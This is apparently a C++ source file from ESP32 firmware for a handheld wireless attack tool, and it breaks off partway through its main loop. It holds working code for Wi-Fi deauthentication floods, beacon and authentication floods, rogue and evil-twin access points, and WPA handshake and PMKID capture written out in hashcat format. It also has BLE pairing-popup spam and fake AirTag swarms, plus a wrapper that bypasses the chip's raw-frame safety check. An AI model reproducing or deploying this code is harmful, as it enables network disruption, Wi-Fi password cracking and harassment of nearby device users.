#include "FireActivity.h"

#include <cstring>
#include <cstdio>
#include <esp_wifi.h>
#include <esp_random.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <WiFi.h>

#include "MappedInputManager.h"
#include "components/UITheme.h"
#include "fontIds.h"
#include "util/RadioManager.h"

// ---------------------------------------------------------------------------
// Path-safe filename helper — replaces every character that is not
// alphanumeric, '-', '_', or '.' with '_'.  Falls back to "capture" if the
// result would be empty.
// ---------------------------------------------------------------------------
static void sanitizeFilename(char* out, size_t outLen, const char* input) {
    size_t j = 0;
    for (size_t i = 0; input[i] && j < outLen - 1; i++) {
        char c = input[i];
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
            out[j++] = c;
        } else {
            out[j++] = '_';
        }
    }
    out[j] = '\0';
    if (j == 0) { strncpy(out, "capture", outLen); out[outLen - 1] = '\0'; }
}

// Forward-declare the real (wrapped) function so normal WiFi ops still work.
// --wrap causes all calls to ieee80211_raw_frame_sanity_check to land here;
// we only bypass the check while FireActivity is actively sending raw frames.
extern "C" int __real_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);

static volatile bool s_bypassFrameCheck = false;

extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (s_bypassFrameCheck) return 0;
    return __real_ieee80211_raw_frame_sanity_check(arg, arg2, arg3);
}

// Static members
PacketRingBuffer FireActivity::captureBuf;

// ---------------------------------------------------------------------------
// Promiscuous callback — EAPOL filter
// ---------------------------------------------------------------------------

void IRAM_ATTR FireActivity::captureCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    auto* pkt = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    // Determine LLC/SNAP offset (QoS bit is in subtype field)
    // Data frame: FC byte0 bits 7-4 = subtype. QoS data = 0x88 (subtype 8)
    bool qos = (d[0] & 0xF0) == 0x80; // subtype >= 8 means QoS
    int llcOff = qos ? 26 : 24;

    if (len <= (uint16_t)(llcOff + 8)) return;

    // Check LLC/SNAP: AA AA 03 00 00 00 + EtherType 888E (EAPOL)
    if (d[llcOff] == 0xAA && d[llcOff + 1] == 0xAA &&
        d[llcOff + 2] == 0x03 &&
        d[llcOff + 6] == 0x88 && d[llcOff + 7] == 0x8E) {
        captureBuf.push(pkt);
    }
}

// ---------------------------------------------------------------------------
// Attack classification helpers
// ---------------------------------------------------------------------------

bool FireActivity::isUniversalAttack(AttackType atk) {
    return atk == ATK_BLE_SPAM || atk == ATK_AIRTAG_SWARM ||
           atk == ATK_BEACON_FLOOD || atk == ATK_KARMA_AP;
}

TargetType FireActivity::requiredTargetType(AttackType atk) const {
    switch (atk) {
        case ATK_BLE_CLONE:
        case ATK_BLE_ENUMERATE:
            return TargetType::BLE;
        default:
            return TargetType::AP;
    }
}

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------

void FireActivity::setTarget(const uint8_t mac[6]) {
    memcpy(targetMac, mac, 6);
    hasPreselected = true;
}

void FireActivity::setAttack(int attackType) {
    preselectedAttack = attackType;
}

void FireActivity::onEnter() {
    Activity::onEnter();
    TARGETS.loadCache();

    targetCount = 0;
    targetIndex = 0;
    attackIndex = 0;
    packetsSent = 0;
    eapolCount = 0;
    pmkidFound = false;
    captureComplete = false;
    beaconCount = 0;
    statusLine[0] = '\0';
    resultLine[0] = '\0';
    pendingAttack = ATK_COUNT;

    if (hasPreselected) {
        target = TARGETS.findByMac(targetMac);
    }

    // Always start with attack menu — target is optional
    buildAttackMenu();
    state = ATTACK_SELECT;

    if (preselectedAttack >= 0) {
        for (int i = 0; i < availableCount; i++) {
            if (attacks[i].type == static_cast<AttackType>(preselectedAttack)) {
                attackIndex = i;
                if (attacks[i].available) {
                    state = CONFIRM;
                }
                break;
            }
        }
        preselectedAttack = -1;
    }

    loadTargetList();

    requestUpdate();
}

void FireActivity::loadTargetList() {
    targetCount = 0;
    targetIndex = 0;

    if (pendingAttack < ATK_COUNT && !isUniversalAttack(pendingAttack)) {
        // Filter to only the type needed by the pending attack
        TargetType needed = requiredTargetType(pendingAttack);
        TARGETS.getSorted(needed, targetList, 50, targetCount, 0);
    } else {
        // No specific attack context — show APs + BLE (no STAs)
        TARGETS.getSorted(TargetType::AP, targetList, 25, targetCount, 0);
        int bleCount = 0;
        Target* bleList[25] = {};
        TARGETS.getSorted(TargetType::BLE, bleList, 25, bleCount, 0);
        for (int i = 0; i < bleCount && targetCount < 50; i++)
            targetList[targetCount++] = bleList[i];
    }
}

void FireActivity::onExit() {
    stopAttack();
    Activity::onExit();
}

// ---------------------------------------------------------------------------
// Build attack menu based on target properties
// ---------------------------------------------------------------------------

void FireActivity::buildAttackMenu() {
    availableCount = 0;

    bool filtering = (target != nullptr);
    TargetType ttype = target ? target->type : TargetType::AP;

    auto add = [this](AttackType t, const char* n, const char* d, bool avail) {
        if (availableCount < ATK_COUNT) {
            attacks[availableCount++] = {t, n, d, avail};
        }
    };

    auto show = [&](AttackType atk) -> bool {
        if (isUniversalAttack(atk)) return true;
        if (!filtering) return true;
        return requiredTargetType(atk) == ttype;
    };

    // --- Universal ---
    add(ATK_BLE_SPAM, "BLE Spam", "Apple/Google/Samsung/Windows flood", true);
    add(ATK_AIRTAG_SWARM, "AirTag Swarm", "Spawn 20 fake FindMy tags", true);
    add(ATK_BEACON_FLOOD, "Beacon Flood", "Spam 30 fake SSIDs", true);
    add(ATK_KARMA_AP, "Karma AP", "Respond to nearby probe requests", true);

    // --- WiFi AP targeted ---
    bool hasAp = target && target->type == TargetType::AP;
    if (show(ATK_DEAUTH_BROADCAST))
        add(ATK_DEAUTH_BROADCAST, "Deauth Broadcast",
            hasAp ? (target->pmf ? "BLOCKED - PMF" : "Disconnect all clients")
                  : "(select WiFi AP target)",
            hasAp && !target->pmf);
    if (show(ATK_DEAUTH_TARGETED))
        add(ATK_DEAUTH_TARGETED, "Deauth Targeted",
            hasAp ? "Disconnect specific client" : "(select WiFi AP target)",
            hasAp && !target->pmf);
    if (show(ATK_ROGUE_AP))
        add(ATK_ROGUE_AP, "Rogue AP",
            hasAp ? "Clone BSSID, auto-deauth" : "(select WiFi AP target)",
            hasAp);
    if (show(ATK_HANDSHAKE_CAPTURE))
        add(ATK_HANDSHAKE_CAPTURE, "Handshake Capture",
            hasAp ? "Deauth + capture 4-way EAPOL" : "(select WiFi AP target)",
            hasAp && target->authType >= 2);
    if (show(ATK_PMKID_HARVEST))
        add(ATK_PMKID_HARVEST, "PMKID Harvest",
            hasAp ? "Passive - no deauth needed" : "(select WiFi AP target)",
            hasAp && target->authType >= 2);
    if (show(ATK_EVIL_TWIN))
        add(ATK_EVIL_TWIN, "Evil Twin + Portal",
            hasAp ? "Clone AP with captive portal" : "(select WiFi AP target)",
            hasAp);
    if (show(ATK_AUTH_FLOOD))
        add(ATK_AUTH_FLOOD, "Auth Flood",
            hasAp ? "Exhaust AP association table" : "(select WiFi AP target)",
            hasAp);

    // --- BLE targeted ---
    bool hasBle = target && target->type == TargetType::BLE;
    if (show(ATK_BLE_CLONE))
        add(ATK_BLE_CLONE, "BLE Clone",
            hasBle ? "Replay this device's BLE adverts" : "(select BLE target)",
            hasBle);
    if (show(ATK_BLE_ENUMERATE))
        add(ATK_BLE_ENUMERATE, "BLE Enumerate",
            hasBle ? "Connect + dump GATT services" : "(select BLE target)",
            hasBle);
}

// ---------------------------------------------------------------------------
// Attack start / stop
// ---------------------------------------------------------------------------

void FireActivity::startAttack() {
    activeAttack = attacks[attackIndex].type;
    state = EXECUTING;
    attackStartMs = millis();
    lastActionMs = 0;
    lastDisplayMs = 0;
    packetsSent = 0;
    eapolCount = 0;
    pmkidFound = false;
    captureComplete = false;
    beaconCount = 0;
    karmaIndex = 0;
    statusLine[0] = '\0';

    // Enable raw frame bypass for WiFi-based operations
    s_bypassFrameCheck = true;

    // Prepare radio based on attack type
    switch (activeAttack) {
        case ATK_BLE_CLONE:
        case ATK_BLE_SPAM:
        case ATK_BLE_ENUMERATE:
        case ATK_AIRTAG_SWARM:
            RADIO.ensureBle();
            break;
        default:
            RADIO.ensureWifi();
            break;
    }

    // Attack-specific init
    switch (activeAttack) {
        case ATK_HANDSHAKE_CAPTURE:
        case ATK_PMKID_HARVEST: {
            if (!target) break;
            // Set channel and start promiscuous capture
            uint8_t ch = target->channel;
            if (ch == 0) ch = 1;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            esp_wifi_set_promiscuous_rx_cb(captureCallback);
            esp_wifi_set_promiscuous(true);

            // Create PCAP file with sanitized SSID in name
            char ssidSafe[33];
            sanitizeFilename(ssidSafe, sizeof(ssidSafe),
                             target->ssid[0] ? target->ssid : "capture");
            char path[80];
            snprintf(path, sizeof(path), "/biscuit/loot/handshakes/%s.pcap", ssidSafe);
            savePcapHeader(path);
            break;
        }
        case ATK_BEACON_FLOOD: {
            // Generate random SSIDs
            for (int i = 0; i < FLOOD_SSID_COUNT; i++) {
                int len = 8 + (esp_random() % 12); // 8-19 chars
                for (int j = 0; j < len; j++) {
                    floodSSIDs[i][j] = 'A' + (esp_random() % 26);
                }
                floodSSIDs[i][len] = '\0';
            }
            // Need promiscuous or NULL mode for raw TX
            esp_wifi_set_promiscuous(true);
            break;
        }
        case ATK_AUTH_FLOOD:
            esp_wifi_set_promiscuous(true);
            break;
        case ATK_ROGUE_AP:
        case ATK_EVIL_TWIN:
        case ATK_KARMA_AP:
            // Will configure SoftAP in tick
            break;
        case ATK_DEAUTH_BROADCAST:
        case ATK_DEAUTH_TARGETED:
            esp_wifi_set_promiscuous(true);
            break;
        default:
            break;
    }

    requestUpdate();
}

void FireActivity::stopAttack() {
    // Restore normal frame validation
    s_bypassFrameCheck = false;

    // Stop all radio activity
    esp_wifi_set_promiscuous(false);

    // If we were running SoftAP, stop it
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) {
        esp_wifi_set_mode(WIFI_MODE_STA);
    }

    // Stop BLE if active
    if (BLEDevice::getInitialized()) {
        BLEAdvertising* adv = BLEDevice::getAdvertising();
        if (adv) adv->stop();
    }

    RADIO.shutdown();
}

// ---------------------------------------------------------------------------
// Helpers — frame building
// ---------------------------------------------------------------------------

void FireActivity::randomMAC(uint8_t mac[6]) {
    for (int i = 0; i < 6; i++) mac[i] = esp_random() & 0xFF;
    mac[0] = (mac[0] & 0xFC) | 0x02; // locally administered, unicast
}

void FireActivity::buildDeauthFrame(uint8_t* frame, const uint8_t* bssid, const uint8_t* client) {
    // 802.11 deauthentication frame — 26 bytes
    memset(frame, 0, 26);
    frame[0] = 0xC0;  // Type: Management, Subtype: Deauthentication
    frame[1] = 0x00;
    // Duration
    frame[2] = 0x00; frame[3] = 0x00;
    // Addr1 (destination) — client or broadcast
    memcpy(frame + 4, client, 6);
    // Addr2 (source) — AP BSSID
    memcpy(frame + 10, bssid, 6);
    // Addr3 (BSSID) — AP BSSID
    memcpy(frame + 16, bssid, 6);
    // Seq control
    frame[22] = 0x00; frame[23] = 0x00;
    // Reason code: 0x0002 = Previous authentication no longer valid
    frame[24] = 0x02; frame[25] = 0x00;
}

void FireActivity::buildBeaconFrame(uint8_t* frame, int& len, const char* ssid,
                                     const uint8_t* bssid, uint8_t channel) {
    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    memset(frame, 0, 128);
    int p = 0;

    // Frame control: Beacon
    frame[p++] = 0x80; frame[p++] = 0x00;
    // Duration
    frame[p++] = 0x00; frame[p++] = 0x00;
    // Addr1: broadcast
    memset(frame + p, 0xFF, 6); p += 6;
    // Addr2: source (BSSID)
    memcpy(frame + p, bssid, 6); p += 6;
    // Addr3: BSSID
    memcpy(frame + p, bssid, 6); p += 6;
    // Seq control
    frame[p++] = 0x00; frame[p++] = 0x00;

    // Fixed parameters (12 bytes)
    // Timestamp (8 bytes) — zeros
    p += 8;
    // Beacon interval: 100 TU (0x0064)
    frame[p++] = 0x64; frame[p++] = 0x00;
    // Capabilities: ESS (0x0001)
    frame[p++] = 0x01; frame[p++] = 0x00;

    // Tagged parameters
    // SSID
    frame[p++] = 0x00;           // Tag: SSID
    frame[p++] = (uint8_t)ssidLen;
    memcpy(frame + p, ssid, ssidLen); p += ssidLen;

    // Supported rates
    frame[p++] = 0x01;           // Tag: Supported Rates
    frame[p++] = 0x08;           // Length
    frame[p++] = 0x82; frame[p++] = 0x84; frame[p++] = 0x8B; frame[p++] = 0x96;
    frame[p++] = 0x24; frame[p++] = 0x30; frame[p++] = 0x48; frame[p++] = 0x6C;

    // DS Parameter Set (channel)
    frame[p++] = 0x03;           // Tag: DS Parameter
    frame[p++] = 0x01;           // Length
    frame[p++] = channel;

    len = p;
}

void FireActivity::buildAuthFrame(uint8_t* frame, const uint8_t* bssid, const uint8_t* src) {
    // 802.11 Authentication frame — 30 bytes
    memset(frame, 0, 30);
    frame[0] = 0xB0;  // Type: Management, Subtype: Authentication
    frame[1] = 0x00;
    frame[2] = 0x00; frame[3] = 0x00; // Duration
    memcpy(frame + 4, bssid, 6);      // Dest = AP
    memcpy(frame + 10, src, 6);        // Source = random
    memcpy(frame + 16, bssid, 6);      // BSSID = AP
    frame[22] = 0x00; frame[23] = 0x00; // Seq
    // Auth algorithm: Open System (0x0000)
    frame[24] = 0x00; frame[25] = 0x00;
    // Auth seq number: 1
    frame[26] = 0x01; frame[27] = 0x00;
    // Status: success
    frame[28] = 0x00; frame[29] = 0x00;
}

// ---------------------------------------------------------------------------
// PCAP writing
// ---------------------------------------------------------------------------

void FireActivity::savePcapHeader(const char* path) {
    Storage.mkdir("/biscuit/loot/handshakes");
    FsFile file;
    if (!Storage.openFileForWrite("FIRE", path, file)) return;

    // Global header: magic, version 2.4, snaplen 65535, linktype 105 (802.11)
    uint8_t hdr[24] = {
        0xD4, 0xC3, 0xB2, 0xA1, // magic
        0x02, 0x00, 0x04, 0x00, // version 2.4
        0x00, 0x00, 0x00, 0x00, // thiszone
        0x00, 0x00, 0x00, 0x00, // sigfigs
        0xFF, 0xFF, 0x00, 0x00, // snaplen 65535
        0x69, 0x00, 0x00, 0x00  // linktype 105 = IEEE 802.11
    };
    file.write(hdr, 24);
    file.flush();
    file.close();
}

void FireActivity::appendPcapPacket(const char* path, const uint8_t* data, uint16_t len) {
    // Open for append
    FsFile file = Storage.open(path, O_WRITE | O_CREAT | O_APPEND);
    if (!file) return;

    uint32_t ts = (uint32_t)(esp_timer_get_time() / 1000000ULL);
    uint32_t us = (uint32_t)(esp_timer_get_time() % 1000000ULL);

    // Packet header: ts_sec, ts_usec, incl_len, orig_len
    uint8_t phdr[16];
    memcpy(phdr, &ts, 4);
    memcpy(phdr + 4, &us, 4);
    uint32_t l = len;
    memcpy(phdr + 8, &l, 4);
    memcpy(phdr + 12, &l, 4);
    file.write(phdr, 16);
    file.write(data, len);
    file.flush();
    file.close();
}

// ---------------------------------------------------------------------------
// EAPOL processing
// ---------------------------------------------------------------------------

void FireActivity::processCaptureBuf() {
    CapturedPacket pkt;
    while (captureBuf.pop(pkt)) {
        checkEapolFrame(pkt.data, pkt.len);
    }
}

void FireActivity::checkEapolFrame(const uint8_t* data, uint16_t len) {
    // Save raw frame to PCAP
    char ssidSafe[33];
    sanitizeFilename(ssidSafe, sizeof(ssidSafe),
                     (target && target->ssid[0]) ? target->ssid : "capture");
    char path[80];
    snprintf(path, sizeof(path), "/biscuit/loot/handshakes/%s.pcap", ssidSafe);
    appendPcapPacket(path, data, len);

    // Determine EAPOL offset
    bool qos = (data[0] & 0xF0) == 0x80;
    int llcOff = qos ? 26 : 24;
    int eapolOff = llcOff + 8; // After LLC/SNAP

    if (len <= (uint16_t)(eapolOff + 4)) return;

    uint8_t eapolType = data[eapolOff + 1]; // Type field
    if (eapolType != 0x03) return; // Not EAPOL-Key

    eapolCount++;
    snprintf(statusLine, sizeof(statusLine), "EAPOL frame %d/4 captured", eapolCount);

    // Check for PMKID in message 1 (from AP to STA)
    // Message 1: Key Info has bit 3 (Pairwise) set, bit 6 (Install) NOT set
    // PMKID is in RSN KDE at end of Key Data: OUI 00:0F:AC, data type 04
    if (eapolCount == 1 && len > (uint16_t)(eapolOff + 100)) {
        // Search for PMKID KDE: tag 0xDD, OUI 00:0F:AC:04
        for (int i = eapolOff + 76; i < len - 20; i++) {
            if (data[i] == 0xDD && i + 22 <= len &&
                data[i + 2] == 0x00 && data[i + 3] == 0x0F &&
                data[i + 4] == 0xAC && data[i + 5] == 0x04) {
                pmkidFound = true;

                // Save PMKID in hashcat format
                char pmkidSafe[33];
                sanitizeFilename(pmkidSafe, sizeof(pmkidSafe),
                                 (target && target->ssid[0]) ? target->ssid : "capture");
                char pmkidPath[80];
                snprintf(pmkidPath, sizeof(pmkidPath), "/biscuit/loot/pmkid/%s.pmkid", pmkidSafe);
                Storage.mkdir("/biscuit/loot/pmkid");

                FsFile pf;
                if (Storage.openFileForWrite("FIRE", pmkidPath, pf)) {
                    // Format: PMKID*MAC_AP*MAC_STA*ESSID_HEX
                    char line[256];
                    int pos = 0;
                    // PMKID (16 bytes at i+6)
                    for (int j = 0; j < 16; j++)
                        pos += snprintf(line + pos, sizeof(line) - pos, "%02x", data[i + 6 + j]);
                    pos += snprintf(line + pos, sizeof(line) - pos, "*");
                    // MAC AP (addr2 = bytes 10-15)
                    for (int j = 10; j < 16; j++)
                        pos += snprintf(line + pos, sizeof(line) - pos, "%02x", data[j]);
                    pos += snprintf(line + pos, sizeof(line) - pos, "*");
                    // MAC STA (addr1 = bytes 4-9)
                    for (int j = 4; j < 10; j++)
                        pos += snprintf(line + pos, sizeof(line) - pos, "%02x", data[j]);
                    pos += snprintf(line + pos, sizeof(line) - pos, "*");
                    // ESSID hex
                    if (target && target->ssid[0]) {
                        for (int j = 0; target->ssid[j] && j < 32; j++)
                            pos += snprintf(line + pos, sizeof(line) - pos, "%02x", (uint8_t)target->ssid[j]);
                    }
                    pos += snprintf(line + pos, sizeof(line) - pos, "\n");
                    pf.write(reinterpret_cast<const uint8_t*>(line), strlen(line));
                    pf.flush();
                    pf.close();
                }

                snprintf(statusLine, sizeof(statusLine), "PMKID captured!");
                if (target) target->hasPmkid = true;
                break;
            }
        }
    }

    if (eapolCount >= 4) {
        captureComplete = true;
        if (target) target->hasHandshake = true;
        snprintf(statusLine, sizeof(statusLine), "4-way handshake complete!");
    }
}

// ---------------------------------------------------------------------------
// Attack tick functions — called from loop() during EXECUTING
// ---------------------------------------------------------------------------

void FireActivity::tickDeauthBroadcast() {
    if (!target) return;
    unsigned long now = millis();
    if (now - lastActionMs < 50) return; // ~20 packets/sec
    lastActionMs = now;

    uint8_t frame[26];
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    buildDeauthFrame(frame, target->mac, broadcast);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
    packetsSent++;

    snprintf(statusLine, sizeof(statusLine), "Deauth broadcast: %lu pkts", (unsigned long)packetsSent);
}

void FireActivity::tickDeauthTargeted() {
    if (!target) return;
    // Deauth using target's BSSID → send to each known client
    unsigned long now = millis();
    if (now - lastActionMs < 100) return;
    lastActionMs = now;

    // If target is STA, deauth it from its AP
    uint8_t frame[26];
    if (target->type == TargetType::STA) {
        buildDeauthFrame(frame, target->bssid, target->mac);
    } else {
        // AP target: broadcast deauth (targeted per-client needs client list)
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        buildDeauthFrame(frame, target->mac, broadcast);
    }
    esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
    packetsSent++;

    snprintf(statusLine, sizeof(statusLine), "Deauth targeted: %lu pkts", (unsigned long)packetsSent);
}

void FireActivity::tickRogueAp() {
    if (!target) return;
    // Only need to set up once — ESP32 auto-deauths per 802.11
    if (packetsSent > 0) return; // already started

    // Clone target AP's BSSID
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_mac(WIFI_IF_AP, target->mac);

    wifi_config_t apCfg = {};
    strncpy((char*)apCfg.ap.ssid, target->ssid, 32);
    apCfg.ap.ssid_len = strlen(target->ssid);
    apCfg.ap.channel = target->channel ? target->channel : 1;
    apCfg.ap.authmode = WIFI_AUTH_OPEN;
    apCfg.ap.max_connection = 4;
    esp_wifi_set_config(WIFI_IF_AP, &apCfg);

    packetsSent = 1;
    snprintf(statusLine, sizeof(statusLine), "Rogue AP active: %s (ch%d)",
             target->ssid, (int)apCfg.ap.channel);
}

void FireActivity::tickHandshakeCapture() {
    if (!target) return;
    if (captureComplete) {
        state = RESULTS;
        snprintf(resultLine, sizeof(resultLine),
                 "Handshake captured!\n%d EAPOL frames, PMKID: %s\nSaved to /biscuit/loot/handshakes/",
                 eapolCount, pmkidFound ? "Yes" : "No");
        stopAttack();
        requestUpdate();
        return;
    }

    // Send periodic deauth to force reconnection (every 2 sec, 3 rounds)
    unsigned long now = millis();
    unsigned long elapsed = now - attackStartMs;

    if (elapsed < 6000 && now - lastActionMs >= 500) {
        lastActionMs = now;
        uint8_t frame[26];
        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

        if (target->type == TargetType::STA) {
            buildDeauthFrame(frame, target->bssid, target->mac);
        } else {
            buildDeauthFrame(frame, target->mac, broadcast);
        }
        esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
        packetsSent++;
    }

    // Process captured EAPOL frames
    processCaptureBuf();

    // Timeout after 60 seconds
    if (elapsed > 60000 && !captureComplete) {
        state = RESULTS;
        snprintf(resultLine, sizeof(resultLine),
                 "Timeout. %d EAPOL frames, PMKID: %s",
                 eapolCount, pmkidFound ? "Yes" : "No");
        stopAttack();
        requestUpdate();
    }

    snprintf(statusLine, sizeof(statusLine), "Capturing... EAPOL:%d PMKID:%s %lus",
             eapolCount, pmkidFound ? "Y" : "N", elapsed / 1000);
}

void FireActivity::tickPmkidHarvest() {
    if (!target) return;
    if (pmkidFound) {
        state = RESULTS;
        snprintf(resultLine, sizeof(resultLine),
                 "PMKID captured!\nSaved to /biscuit/loot/pmkid/");
        stopAttack();
        requestUpdate();
        return;
    }

    // Passive — just listen for EAPOL message 1
    processCaptureBuf();

    unsigned long elapsed = millis() - attackStartMs;
    if (elapsed > 120000) { // 2 min timeout
        state = RESULTS;
        snprintf(resultLine, sizeof(resultLine),
                 "Timeout — no PMKID found.\nTry handshake capture instead.");
        stopAttack();
        requestUpdate();
    }

    snprintf(statusLine, sizeof(statusLine), "Listening for PMKID... %lus", elapsed / 1000);
}

void FireActivity::tickBeaconFlood() {
    unsigned long now = millis();
    if (now - lastActionMs < 30) return; // ~33 beacons/sec
    lastActionMs = now;

    int idx = beaconCount % FLOOD_SSID_COUNT;
    uint8_t bssid[6];
    randomMAC(bssid);

    uint8_t frame[128];
    int len = 0;
    buildBeaconFrame(frame, len, floodSSIDs[idx], bssid, 1 + (beaconCount % 13));
    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true);
    beaconCount++;
    packetsSent++;

    snprintf(statusLine, sizeof(statusLine), "Beacon flood: %d beacons (%d SSIDs)",
             beaconCount, FLOOD_SSID_COUNT);
}

void FireActivity::tickAuthFlood() {
    if (!target) return;
    unsigned long now = millis();
    if (now - lastActionMs < 20) return; // ~50/sec
    lastActionMs = now;

    uint8_t src[6];
    randomMAC(src);

    uint8_t frame[30];
    buildAuthFrame(frame, target->mac, src);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, 30, false);
    packetsSent++;

    snprintf(statusLine, sizeof(statusLine), "Auth flood: %lu requests sent",
             (unsigned long)packetsSent);
}

void FireActivity::tickKarmaAp() {
    // Cycle through target's probed SSIDs, creating AP for each
    if (!target || target->probeCount == 0) {
        snprintf(statusLine, sizeof(statusLine), "No probed SSIDs known for target");
        return;
    }

    unsigned long now = millis();
    if (now - lastActionMs < 5000) return; // Switch SSID every 5 sec
    lastActionMs = now;

    const char* ssid = target->probes[karmaIndex % target->probeCount];
    karmaIndex++;

    esp_wifi_set_mode(WIFI_MODE_AP);
    wifi_config_t apCfg = {};
    strncpy((char*)apCfg.ap.ssid, ssid, 32);
    apCfg.ap.ssid_len = strlen(ssid);
    apCfg.ap.channel = 1;
    apCfg.ap.authmode = WIFI_AUTH_OPEN;
    apCfg.ap.max_connection = 4;
    esp_wifi_set_config(WIFI_IF_AP, &apCfg);

    packetsSent++;
    snprintf(statusLine, sizeof(statusLine), "Karma: serving \"%s\" (%d/%d)",
             ssid, (karmaIndex - 1) % target->probeCount + 1, (int)target->probeCount);
}

void FireActivity::tickEvilTwin() {
    if (!target) return;
    // Set up once — clone AP + serve captive portal
    if (packetsSent > 0) return;

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    // Clone SSID but use our own MAC (not rogue clone)
    wifi_config_t apCfg = {};
    strncpy((char*)apCfg.ap.ssid, target->ssid, 32);
    apCfg.ap.ssid_len = strlen(target->ssid);
    apCfg.ap.channel = target->channel ? target->channel : 1;
    apCfg.ap.authmode = WIFI_AUTH_OPEN;
    apCfg.ap.max_connection = 4;
    esp_wifi_set_config(WIFI_IF_AP, &apCfg);

    // TODO: Start DNS server + HTTP captive portal
    // For now, just create the AP. Full portal integration
    // would reuse CaptivePortalActivity's web server logic.

    packetsSent = 1;
    snprintf(statusLine, sizeof(statusLine), "Evil Twin active: \"%s\" (open, ch%d)",
             target->ssid, (int)apCfg.ap.channel);
}

void FireActivity::tickBleClone() {
    // TODO: Read target BLE adv data from TargetDB and replay
    // For now, just show placeholder
    if (packetsSent > 0) return;
    packetsSent = 1;
    snprintf(statusLine, sizeof(statusLine), "BLE Clone: needs adv data capture in SCAN");
}

void FireActivity::tickBleSpam() {
    // Reuse BleSpamActivity's logic — Apple/Google/Samsung/Windows
    unsigned long now = millis();
    if (now - lastActionMs < 100) return;
    lastActionMs = now;

    BLEAdvertising* adv = BLEDevice::getAdvertising();
    if (!adv) return;
    adv->stop();

    BLEAdvertisementData advData;
    int platform = packetsSent % 4;

    switch (platform) {
        case 0: {
            // Apple Proximity Pairing: company 0x004C, type 0x07
            uint8_t appleData[27];
            appleData[0] = 0x4C; appleData[1] = 0x00; // Company: Apple
            appleData[2] = 0x07; // Type: Proximity Pairing
            appleData[3] = 0x19; // Length: 25
            // Device type (randomized)
            uint8_t types[][2] = {{0x20,0x02},{0x0E,0x20},{0x0A,0x20},{0x13,0x20}};
            int ti = esp_random() % 4;
            appleData[4] = types[ti][0]; appleData[5] = types[ti][1];
            appleData[6] = 0x01; // Status
            for (int i = 7; i < 27; i++) appleData[i] = esp_random() & 0xFF;

            advData.setManufacturerData(String((char*)appleData, 27));
            break;
        }
        case 1: {
            // Google Fast Pair: service UUID 0xFE2C + model ID
            uint32_t models[] = {0x000047, 0x00B727, 0xCD8256};
            uint32_t model = models[esp_random() % 3];
            uint8_t svcData[4] = {0x2C, 0xFE, // UUID 0xFE2C little-endian
                                   (uint8_t)((model >> 16) & 0xFF),
                                   (uint8_t)((model >> 8) & 0xFF)};
            advData.setServiceData(BLEUUID((uint16_t)0xFE2C),
                                    String((char*)svcData + 2, 2));
            break;
        }
        case 2: {
            // Samsung: company 0x0075
            uint8_t samData[12];
            samData[0] = 0x75; samData[1] = 0x00; // Company: Samsung
            for (int i = 2; i < 12; i++) samData[i] = esp_random() & 0xFF;
            advData.setManufacturerData(String((char*)samData, 12));
            break;
        }
        case 3: {
            // Windows Swift Pair: company 0x0006
            uint8_t msData[6];
            msData[0] = 0x06; msData[1] = 0x00; // Company: Microsoft
            msData[2] = 0x03;  // Scenario: Swift Pair
            msData[3] = 0x00;  // RSSI
            msData[4] = esp_random() & 0xFF;
            msData[5] = esp_random() & 0xFF;
            advData.setManufacturerData(String((char*)msData, 6));
            break;
        }
    }

    // Randomize BLE address
    uint8_t addr[6];
    randomMAC(addr);
    addr[0] |= 0xC0; // Random static address

    adv->setAdvertisementData(advData);
    adv->start();
    packetsSent++;

    const char* names[] = {"Apple", "Google", "Samsung", "Windows"};
    snprintf(statusLine, sizeof(statusLine), "BLE Spam: %lu adverts (%s)",
             (unsigned long)packetsSent, names[platform]);
}

void FireActivity::tickBleEnumerate() {
    // TODO: Connect to target BLE device, discover services, dump
    if (packetsSent > 0) return;
    packetsSent = 1;
    snprintf(statusLine, sizeof(statusLine), "BLE Enumerate: connect + GATT dump (TODO)");
}

void FireActivity::tickAirtagSwarm() {
    unsigned long now = millis();
    if (now - lastActionMs < 200) return; // 5 tags/sec
    lastActionMs = now;

    BLEAdvertising* adv = BLEDevice::getAdvertising();
    if (!adv) return;
    adv->stop();

    BLEAdvertisementData advData;

    // Apple FindMy advertisement: company 0x004C, type 0x12, payload 0x19
    uint8_t findMyData[29];
    findMyData[0] = 0x4C; findMyData[1] = 0x00; // Apple
    findMyData[2] = 0x12; // FindMy type
    findMyData[3] = 0x19; // Length
    findMyData[4] = 0x10; // Status
    // Random public key (22 bytes)
    for (int i = 5; i < 27; i++) findMyData[i] = esp_random() & 0xFF;
    findMyData[27] = 0x00; findMyData[28] = 0x00;

    advData.setManufacturerData(String((char*)findMyData, 29));

    uint8_t addr[6];
    randomMAC(addr);
    addr[0] |= 0xC0;

    adv->setAdvertisementData(advData);
    adv->start();
    packetsSent++;

    snprintf(statusLine, sizeof(statusLine), "AirTag Swarm: %lu fake tags",
             (unsigned long)packetsSent);
}

// ---------------------------------------------------------------------------
// Loop
// ---------------------------------------------------------------------------

void FireActivity::loop() {
    switch (state) {
